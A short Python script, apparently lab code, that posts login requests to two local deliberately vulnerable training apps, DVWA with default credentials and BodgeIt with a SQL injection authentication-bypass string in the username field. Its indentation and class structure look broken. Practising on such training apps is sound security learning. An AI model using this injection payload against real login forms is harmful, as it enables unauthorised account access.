import requests
import sys


class customauth():
	site = input("what site?")
	# takes in the argument from the command line and decides which hardcoded authentication to use
	def getsite(site):
		if site.lower() == 'dvwa':
	    		url = 'http://127.0.0.1/dvwa/login.php'
	    		payload = {
    	    		'action'  : 'login',
			'username': 'admin',
    	    		'password': 'password'
	   		}
		if site.lower() == 'bodgeit':
	    		url = 'http://127.0.0.1:8080/bodgeit/login.jsp'
	    		payload = {
			'action'  : 'login',
    	    		'username': "admin@thebodgeitstore.com' or '1'='1",
    	    		'password': ''
	    		}

		p = requests.post(url, data=payload)
		print(p.text)
	getsite(site)
